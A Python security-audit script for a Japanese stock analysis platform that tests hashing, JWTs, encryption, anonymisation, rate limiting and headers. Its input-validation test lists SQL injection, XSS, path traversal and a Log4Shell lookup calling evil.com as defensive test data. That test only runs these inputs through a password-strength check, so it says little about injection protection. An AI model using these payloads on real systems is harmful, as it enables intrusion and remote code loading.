#!/usr/bin/env python3
"""
Production Security and Compliance Validation Script

This script conducts a comprehensive security audit of the Japanese Stock Analysis Platform
to validate GDPR compliance, security implementations, rate limiting, and data encryption.
"""

import asyncio
import json
import os
import sys
import time
import httpx
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
import structlog
import psycopg2
from cryptography.fernet import Fernet
import redis
import jwt

# Add the app directory to Python path
sys.path.append(os.path.join(os.path.dirname(__file__), 'app'))

from app.core.config import settings
from app.core.security import (
    verify_password, get_password_hash, validate_password_strength,
    create_access_token, verify_token, create_email_verification_token
)
from app.core.encryption import EncryptionManager, SecureConfigManager, DataAnonymizer
from app.core.gdpr_compliance import GDPRComplianceManager, DataProcessingPurpose
from app.core.rate_limiting import RateLimiter
from app.core.database import get_db

logger = structlog.get_logger(__name__)


class SecurityAuditResult:
    """Container for security audit results."""
    
    def __init__(self):
        self.tests_run = 0
        self.tests_passed = 0
        self.tests_failed = 0
        self.critical_issues = []
        self.warnings = []
        self.recommendations = []
        self.detailed_results = {}
    
    def add_test_result(self, test_name: str, passed: bool, details: Dict[str, Any]):
        """Add a test result to the audit."""
        self.tests_run += 1
        if passed:
            self.tests_passed += 1
        else:
            self.tests_failed += 1
        
        self.detailed_results[test_name] = {
            "passed": passed,
            "details": details,
            "timestamp": datetime.utcnow().isoformat()
        }
    
    def add_critical_issue(self, issue: str):
        """Add a critical security issue."""
        self.critical_issues.append(issue)
    
    def add_warning(self, warning: str):
        """Add a security warning."""
        self.warnings.append(warning)
    
    def add_recommendation(self, recommendation: str):
        """Add a security recommendation."""
        self.recommendations.append(recommendation)
    
    def get_summary(self) -> Dict[str, Any]:
        """Get audit summary."""
        return {
            "audit_timestamp": datetime.utcnow().isoformat(),
            "tests_run": self.tests_run,
            "tests_passed": self.tests_passed,
            "tests_failed": self.tests_failed,
            "success_rate": (self.tests_passed / self.tests_run * 100) if self.tests_run > 0 else 0,
            "critical_issues_count": len(self.critical_issues),
            "warnings_count": len(self.warnings),
            "recommendations_count": len(self.recommendations),
            "overall_status": "PASS" if self.tests_failed == 0 and len(self.critical_issues) == 0 else "FAIL"
        }


class SecurityAuditor:
    """Main security auditor class."""
    
    def __init__(self):
        self.result = SecurityAuditResult()
        self.base_url = os.getenv("API_BASE_URL", "http://localhost:8000")
        self.test_user_email = "security_test@example.com"
        self.test_user_password = "SecureTest123!"
        
    async def run_full_audit(self) -> SecurityAuditResult:
        """Run complete security audit."""
        logger.info("Starting comprehensive security audit")
        
        # 1. Authentication and Authorization Security
        await self._audit_authentication_security()
        
        # 2. Data Encryption Validation
        await self._audit_data_encryption()
        
        # 3. GDPR Compliance Validation
        await self._audit_gdpr_compliance()
        
        # 4. Rate Limiting and Quota Enforcement
        await self._audit_rate_limiting()
        
        # 5. Database Security
        await self._audit_database_security()
        
        # 6. API Security Headers
        await self._audit_api_security_headers()
        
        # 7. Input Validation and Sanitization
        await self._audit_input_validation()
        
        # 8. Session Management
        await self._audit_session_management()
        
        # 9. Secure Configuration
        await self._audit_secure_configuration()
        
        # 10. Data Anonymization
        await self._audit_data_anonymization()
        
        logger.info("Security audit completed", summary=self.result.get_summary())
        return self.result
    
    async def _audit_authentication_security(self):
        """Audit authentication and authorization security."""
        logger.info("Auditing authentication security")
        
        # Test password hashing
        test_password = "TestPassword123!"
        hashed = get_password_hash(test_password)
        
        # Verify password hashing works
        password_hash_valid = verify_password(test_password, hashed)
        self.result.add_test_result(
            "password_hashing",
            password_hash_valid,
            {"test": "Password hashing and verification", "hash_length": len(hashed)}
        )
        
        # Test password strength validation
        weak_passwords = ["123", "password", "abc123"]
        strong_passwords = ["SecurePass123!", "MyStr0ng!P@ssw0rd"]
        
        weak_rejected = all(not validate_password_strength(pwd)[0] for pwd in weak_passwords)
        strong_accepted = all(validate_password_strength(pwd)[0] for pwd in strong_passwords)
        
        self.result.add_test_result(
            "password_strength_validation",
            weak_rejected and strong_accepted,
            {
                "weak_passwords_rejected": weak_rejected,
                "strong_passwords_accepted": strong_accepted
            }
        )
        
        # Test JWT token security
        test_user_id = "test-user-123"
        token = create_access_token(test_user_id)
        decoded_user_id = verify_token(token)
        
        jwt_valid = decoded_user_id == test_user_id
        self.result.add_test_result(
            "jwt_token_security",
            jwt_valid,
            {"token_created": bool(token), "token_verified": jwt_valid}
        )
        
        # Test token expiration
        try:
            # Create a token with very short expiration
            short_token = create_access_token(test_user_id, timedelta(seconds=1))
            time.sleep(2)  # Wait for token to expire
            expired_result = verify_token(short_token)
            
            token_expiration_works = expired_result is None
            self.result.add_test_result(
                "jwt_token_expiration",
                token_expiration_works,
                {"expired_token_rejected": token_expiration_works}
            )
        except Exception as e:
            self.result.add_test_result(
                "jwt_token_expiration",
                False,
                {"error": str(e)}
            )
    
    async def _audit_data_encryption(self):
        """Audit data encryption implementation."""
        logger.info("Auditing data encryption")
        
        try:
            # Test encryption manager
            encryption_manager = EncryptionManager()
            
            # Test string encryption
            test_data = "sensitive_api_key_12345"
            encrypted = encryption_manager.encrypt(test_data)
            decrypted = encryption_manager.decrypt(encrypted)
            
            encryption_works = decrypted == test_data and encrypted != test_data
            self.result.add_test_result(
                "data_encryption",
                encryption_works,
                {
                    "original_length": len(test_data),
                    "encrypted_length": len(encrypted),
                    "decryption_successful": decrypted == test_data
                }
            )
            
            # Test dictionary encryption
            test_dict = {
                "api_key": "secret_key_123",
                "password": "user_password",
                "token": "auth_token_456"
            }
            
            encrypted_dict = encryption_manager.encrypt_dict(test_dict)
            decrypted_dict = encryption_manager.decrypt_dict(encrypted_dict)
            
            dict_encryption_works = decrypted_dict == test_dict
            self.result.add_test_result(
                "dictionary_encryption",
                dict_encryption_works,
                {
                    "keys_encrypted": len(encrypted_dict),
                    "decryption_successful": dict_encryption_works
                }
            )
            
            # Test secure config manager
            secure_config = SecureConfigManager(encryption_manager)
            test_service = "test_service"
            test_api_key = "test_api_key_12345"
            
            config_set = secure_config.set_api_key(test_service, test_api_key)
            retrieved_key = secure_config.get_api_key(test_service)
            
            secure_config_works = config_set and retrieved_key == test_api_key
            self.result.add_test_result(
                "secure_config_management",
                secure_config_works,
                {
                    "config_set": config_set,
                    "key_retrieved": retrieved_key == test_api_key
                }
            )
            
        except Exception as e:
            self.result.add_test_result(
                "data_encryption",
                False,
                {"error": str(e)}
            )
            self.result.add_critical_issue(f"Data encryption failed: {str(e)}")
    
    async def _audit_gdpr_compliance(self):
        """Audit GDPR compliance implementation."""
        logger.info("Auditing GDPR compliance")
        
        try:
            # Test data anonymization
            anonymizer = DataAnonymizer()
            
            # Test email anonymization
            test_email = "user@example.com"
            anonymized_email = anonymizer.anonymize_email(test_email)
            email_anonymized = anonymized_email != test_email and "@" in anonymized_email
            
            # Test IP anonymization
            test_ip = "192.168.1.100"
            anonymized_ip = anonymizer.anonymize_ip(test_ip)
            ip_anonymized = anonymized_ip != test_ip and "." in anonymized_ip
            
            # Test user ID anonymization
            test_user_id = "user-12345-abcdef"
            anonymized_user_id = anonymizer.anonymize_user_id(test_user_id)
            user_id_anonymized = anonymized_user_id != test_user_id and len(anonymized_user_id) == len(test_user_id)
            
            self.result.add_test_result(
                "data_anonymization",
                email_anonymized and ip_anonymized and user_id_anonymized,
                {
                    "email_anonymized": email_anonymized,
                    "ip_anonymized": ip_anonymized,
                    "user_id_anonymized": user_id_anonymized,
                    "anonymized_email": anonymized_email,
                    "anonymized_ip": anonymized_ip,
                    "anonymized_user_id": anonymized_user_id
                }
            )
            
            # Test sensitive data dictionary anonymization
            sensitive_dict = {
                "email": "user@example.com",
                "password": "secret123",
                "api_key": "key_12345",
                "user_id": "user-123",
                "normal_field": "normal_value"
            }
            
            anonymized_dict = anonymizer.anonymize_dict(sensitive_dict)
            
            # Check that sensitive fields are anonymized but normal fields are not
            sensitive_anonymized = (
                anonymized_dict["email"] != sensitive_dict["email"] and
                anonymized_dict["password"] == "***REDACTED***" and
                anonymized_dict["api_key"] == "***REDACTED***" and
                anonymized_dict["normal_field"] == sensitive_dict["normal_field"]
            )
            
            self.result.add_test_result(
                "sensitive_dict_anonymization",
                sensitive_anonymized,
                {
                    "sensitive_fields_anonymized": sensitive_anonymized,
                    "normal_fields_preserved": anonymized_dict["normal_field"] == sensitive_dict["normal_field"]
                }
            )
            
        except Exception as e:
            self.result.add_test_result(
                "gdpr_compliance",
                False,
                {"error": str(e)}
            )
            self.result.add_critical_issue(f"GDPR compliance validation failed: {str(e)}")
    
    async def _audit_rate_limiting(self):
        """Audit rate limiting implementation."""
        logger.info("Auditing rate limiting")
        
        try:
            # Test in-memory rate limiter
            rate_limiter = RateLimiter()
            
            # Test basic rate limiting
            test_key = "test_user_123"
            limit = 5
            window = 60
            
            # Make requests up to the limit
            allowed_requests = 0
            for i in range(limit + 2):  # Try to exceed limit
                is_allowed, remaining, reset_time = await rate_limiter.is_allowed(
                    test_key, limit, window, "test"
                )
                if is_allowed:
                    allowed_requests += 1
            
            rate_limiting_works = allowed_requests == limit
            self.result.add_test_result(
                "rate_limiting_basic",
                rate_limiting_works,
                {
                    "limit": limit,
                    "allowed_requests": allowed_requests,
                    "rate_limiting_enforced": rate_limiting_works
                }
            )
            
            # Test rate limit reset (using a different key to avoid interference)
            test_key_2 = "test_user_456"
            short_window = 2  # 2 seconds
            
            # Use up the limit
            for i in range(limit):
                await rate_limiter.is_allowed(test_key_2, limit, short_window, "test")
            
            # Check that limit is reached
            is_allowed_before_reset, _, _ = await rate_limiter.is_allowed(
                test_key_2, limit, short_window, "test"
            )
            
            # Wait for window to reset
            await asyncio.sleep(short_window + 1)
            
            # Check that limit is reset
            is_allowed_after_reset, _, _ = await rate_limiter.is_allowed(
                test_key_2, limit, short_window, "test"
            )
            
            rate_limit_reset_works = not is_allowed_before_reset and is_allowed_after_reset
            self.result.add_test_result(
                "rate_limiting_reset",
                rate_limit_reset_works,
                {
                    "blocked_before_reset": not is_allowed_before_reset,
                    "allowed_after_reset": is_allowed_after_reset
                }
            )
            
        except Exception as e:
            self.result.add_test_result(
                "rate_limiting",
                False,
                {"error": str(e)}
            )
            self.result.add_critical_issue(f"Rate limiting validation failed: {str(e)}")
    
    async def _audit_database_security(self):
        """Audit database security configuration."""
        logger.info("Auditing database security")
        
        try:
            # Test database connection security
            db_url = settings.DATABASE_URL
            
            # Check if database URL uses SSL
            uses_ssl = "sslmode" in db_url or "ssl=true" in db_url.lower()
            
            # Check if database credentials are not hardcoded
            credentials_secure = not ("password=" in db_url and "123" in db_url)
            
            self.result.add_test_result(
                "database_connection_security",
                uses_ssl and credentials_secure,
                {
                    "uses_ssl": uses_ssl,
                    "credentials_secure": credentials_secure,
                    "connection_string_length": len(db_url)
                }
            )
            
            # Test database connection
            try:
                # Parse database URL to get connection parameters
                import urllib.parse as urlparse
                parsed = urlparse.urlparse(db_url)
                
                # Test connection (without actually connecting to avoid production impact)
                connection_params_valid = all([
                    parsed.hostname,
                    parsed.port or 5432,
                    parsed.username,
                    parsed.password,
                    parsed.path.lstrip('/')
                ])
                
                self.result.add_test_result(
                    "database_connection_params",
                    connection_params_valid,
                    {
                        "has_hostname": bool(parsed.hostname),
                        "has_port": bool(parsed.port),
                        "has_username": bool(parsed.username),
                        "has_password": bool(parsed.password),
                        "has_database": bool(parsed.path.lstrip('/'))
                    }
                )
                
            except Exception as e:
                self.result.add_test_result(
                    "database_connection_params",
                    False,
                    {"error": str(e)}
                )
        
        except Exception as e:
            self.result.add_test_result(
                "database_security",
                False,
                {"error": str(e)}
            )
    
    async def _audit_api_security_headers(self):
        """Audit API security headers."""
        logger.info("Auditing API security headers")
        
        try:
            # Test health endpoint for security headers
            async with httpx.AsyncClient() as client:
                response = await client.get(f"{self.base_url}/health", timeout=10)
            headers = response.headers
            
            # Check for security headers
            security_headers = {
                "X-Content-Type-Options": "nosniff",
                "X-Frame-Options": ["DENY", "SAMEORIGIN"],
                "X-XSS-Protection": "1; mode=block",
                "Strict-Transport-Security": "max-age=",
                "Content-Security-Policy": "default-src"
            }
            
            headers_present = {}
            for header, expected_values in security_headers.items():
                if isinstance(expected_values, list):
                    headers_present[header] = any(
                        expected in headers.get(header, "") for expected in expected_values
                    )
                else:
                    headers_present[header] = expected_values in headers.get(header, "")
            
            all_headers_present = all(headers_present.values())
            
            self.result.add_test_result(
                "security_headers",
                all_headers_present,
                {
                    "headers_checked": headers_present,
                    "response_headers": dict(headers),
                    "all_present": all_headers_present
                }
            )
            
            if not all_headers_present:
                missing_headers = [h for h, present in headers_present.items() if not present]
                self.result.add_warning(f"Missing security headers: {missing_headers}")
        
        except Exception as e:
            self.result.add_test_result(
                "security_headers",
                False,
                {"error": str(e)}
            )
    
    async def _audit_input_validation(self):
        """Audit input validation and sanitization."""
        logger.info("Auditing input validation")
        
        try:
            # Test SQL injection protection
            malicious_inputs = [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "<script>alert('xss')</script>",
                "../../etc/passwd",
                "${jndi:ldap://evil.com/a}"
            ]
            
            # Test password validation with malicious inputs
            validation_results = []
            for malicious_input in malicious_inputs:
                is_valid, errors = validate_password_strength(malicious_input)
                # Malicious inputs should be rejected (either invalid or cause errors)
                validation_results.append(not is_valid or len(errors) > 0)
            
            input_validation_works = all(validation_results)
            
            self.result.add_test_result(
                "input_validation",
                input_validation_works,
                {
                    "malicious_inputs_tested": len(malicious_inputs),
                    "malicious_inputs_rejected": sum(validation_results),
                    "validation_effective": input_validation_works
                }
            )
            
        except Exception as e:
            self.result.add_test_result(
                "input_validation",
                False,
                {"error": str(e)}
            )
    
    async def _audit_session_management(self):
        """Audit session management security."""
        logger.info("Auditing session management")
        
        try:
            # Test JWT token security properties
            test_user_id = "session_test_user"
            
            # Create token
            token = create_access_token(test_user_id)
            
            # Verify token structure
            try:
                # Decode without verification to check structure
                unverified_payload = jwt.decode(token, options={"verify_signature": False})
                
                has_expiration = "exp" in unverified_payload
                has_subject = "sub" in unverified_payload
                has_type = "type" in unverified_payload
                
                token_structure_valid = has_expiration and has_subject and has_type
                
                self.result.add_test_result(
                    "jwt_token_structure",
                    token_structure_valid,
                    {
                        "has_expiration": has_expiration,
                        "has_subject": has_subject,
                        "has_type": has_type,
                        "token_type": unverified_payload.get("type")
                    }
                )
                
            except Exception as e:
                self.result.add_test_result(
                    "jwt_token_structure",
                    False,
                    {"error": str(e)}
                )
            
            # Test token tampering protection
            tampered_token = token[:-5] + "XXXXX"  # Tamper with token
            tampered_result = verify_token(tampered_token)
            
            tampering_protection = tampered_result is None
            self.result.add_test_result(
                "token_tampering_protection",
                tampering_protection,
                {
                    "tampered_token_rejected": tampering_protection
                }
            )
            
        except Exception as e:
            self.result.add_test_result(
                "session_management",
                False,
                {"error": str(e)}
            )
    
    async def _audit_secure_configuration(self):
        """Audit secure configuration."""
        logger.info("Auditing secure configuration")
        
        try:
            # Check environment variables security
            sensitive_env_vars = [
                "SECRET_KEY",
                "DATABASE_URL",
                "REDIS_URL",
                "ALPHA_VANTAGE_API_KEY",
                "GOOGLE_GEMINI_API_KEY"
            ]
            
            env_vars_set = {}
            env_vars_secure = {}
            
            for var in sensitive_env_vars:
                value = os.getenv(var)
                env_vars_set[var] = bool(value)
                
                if value:
                    # Check if value looks secure (not default/weak)
                    weak_values = ["changeme", "default", "123456", "password", "secret"]
                    env_vars_secure[var] = not any(weak in value.lower() for weak in weak_values)
                else:
                    env_vars_secure[var] = False
            
            all_env_vars_set = all(env_vars_set.values())
            all_env_vars_secure = all(env_vars_secure.values())
            
            self.result.add_test_result(
                "environment_variables",
                all_env_vars_set and all_env_vars_secure,
                {
                    "variables_set": env_vars_set,
                    "variables_secure": env_vars_secure,
                    "all_set": all_env_vars_set,
                    "all_secure": all_env_vars_secure
                }
            )
            
            # Check SECRET_KEY strength
            secret_key = os.getenv("SECRET_KEY", "")
            secret_key_strong = len(secret_key) >= 32 and not secret_key.isalnum()
            
            self.result.add_test_result(
                "secret_key_strength",
                secret_key_strong,
                {
                    "key_length": len(secret_key),
                    "key_strong": secret_key_strong
                }
            )
            
            if not secret_key_strong:
                self.result.add_critical_issue("SECRET_KEY is not strong enough")
        
        except Exception as e:
            self.result.add_test_result(
                "secure_configuration",
                False,
                {"error": str(e)}
            )
    
    async def _audit_data_anonymization(self):
        """Audit data anonymization for logging and analytics."""
        logger.info("Auditing data anonymization")
        
        try:
            anonymizer = DataAnonymizer()
            
            # Test various anonymization methods
            test_cases = [
                {
                    "method": "anonymize_email",
                    "input": "john.doe@company.com",
                    "expected_pattern": r"j\*+@company\.com"
                },
                {
                    "method": "anonymize_ip",
                    "input": "192.168.1.100",
                    "expected_contains": ["192.168", "*"]
                },
                {
                    "method": "anonymize_user_id",
                    "input": "user-12345678-abcdef",
                    "expected_pattern": r"user\*+ef"
                }
            ]
            
            anonymization_results = {}
            for test_case in test_cases:
                method = getattr(anonymizer, test_case["method"])
                result = method(test_case["input"])
                
                # Check that result is different from input
                is_anonymized = result != test_case["input"]
                
                # Check that result contains expected patterns
                pattern_match = True
                if "expected_pattern" in test_case:
                    import re
                    pattern_match = bool(re.search(test_case["expected_pattern"], result))
                elif "expected_contains" in test_case:
                    pattern_match = all(part in result for part in test_case["expected_contains"])
                
                anonymization_results[test_case["method"]] = {
                    "input": test_case["input"],
                    "output": result,
                    "is_anonymized": is_anonymized,
                    "pattern_match": pattern_match,
                    "success": is_anonymized and pattern_match
                }
            
            all_anonymization_works = all(
                result["success"] for result in anonymization_results.values()
            )
            
            self.result.add_test_result(
                "data_anonymization_methods",
                all_anonymization_works,
                anonymization_results
            )
            
        except Exception as e:
            self.result.add_test_result(
                "data_anonymization",
                False,
                {"error": str(e)}
            )
    
    def generate_report(self) -> str:
        """Generate a comprehensive security audit report."""
        summary = self.result.get_summary()
        
        report = f"""
# Security Audit Report - Japanese Stock Analysis Platform
Generated: {summary['audit_timestamp']}

## Executive Summary
- **Overall Status**: {summary['overall_status']}
- **Tests Run**: {summary['tests_run']}
- **Tests Passed**: {summary['tests_passed']}
- **Tests Failed**: {summary['tests_failed']}
- **Success Rate**: {summary['success_rate']:.1f}%
- **Critical Issues**: {summary['critical_issues_count']}
- **Warnings**: {summary['warnings_count']}

## Critical Issues
"""
        
        if self.result.critical_issues:
            for issue in self.result.critical_issues:
                report += f"- ❌ {issue}\n"
        else:
            report += "- ✅ No critical issues found\n"
        
        report += "\n## Warnings\n"
        if self.result.warnings:
            for warning in self.result.warnings:
                report += f"- ⚠️ {warning}\n"
        else:
            report += "- ✅ No warnings\n"
        
        report += "\n## Detailed Test Results\n"
        for test_name, result in self.result.detailed_results.items():
            status = "✅ PASS" if result["passed"] else "❌ FAIL"
            report += f"### {test_name} - {status}\n"
            report += f"- Timestamp: {result['timestamp']}\n"
            
            if isinstance(result["details"], dict):
                for key, value in result["details"].items():
                    report += f"- {key}: {value}\n"
            else:
                report += f"- Details: {result['details']}\n"
            report += "\n"
        
        report += "\n## Recommendations\n"
        if self.result.recommendations:
            for rec in self.result.recommendations:
                report += f"- 💡 {rec}\n"
        else:
            report += "- ✅ No additional recommendations\n"
        
        return report


async def main():
    """Main function to run security audit."""
    print("🔒 Starting Production Security and Compliance Audit")
    print("=" * 60)
    
    auditor = SecurityAuditor()
    result = await auditor.run_full_audit()
    
    # Generate and save report
    report = auditor.generate_report()
    
    # Save report to file
    report_filename = f"security_audit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
    with open(report_filename, 'w') as f:
        f.write(report)
    
    # Save detailed results as JSON
    json_filename = f"security_audit_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(json_filename, 'w') as f:
        json.dump({
            "summary": result.get_summary(),
            "detailed_results": result.detailed_results,
            "critical_issues": result.critical_issues,
            "warnings": result.warnings,
            "recommendations": result.recommendations
        }, f, indent=2)
    
    print(f"\n📊 Security Audit Results:")
    print(f"- Tests Run: {result.tests_run}")
    print(f"- Tests Passed: {result.tests_passed}")
    print(f"- Tests Failed: {result.tests_failed}")
    print(f"- Success Rate: {(result.tests_passed / result.tests_run * 100):.1f}%")
    print(f"- Critical Issues: {len(result.critical_issues)}")
    print(f"- Warnings: {len(result.warnings)}")
    
    print(f"\n📄 Reports saved:")
    print(f"- Markdown Report: {report_filename}")
    print(f"- JSON Results: {json_filename}")
    
    # Print summary
    if result.critical_issues:
        print(f"\n❌ AUDIT FAILED - {len(result.critical_issues)} critical issues found")
        for issue in result.critical_issues:
            print(f"  - {issue}")
        return 1
    elif result.tests_failed > 0:
        print(f"\n⚠️ AUDIT COMPLETED WITH ISSUES - {result.tests_failed} tests failed")
        return 1
    else:
        print(f"\n✅ AUDIT PASSED - All security tests passed")
        return 0


if __name__ == "__main__":
    exit_code = asyncio.run(main())
    sys.exit(exit_code)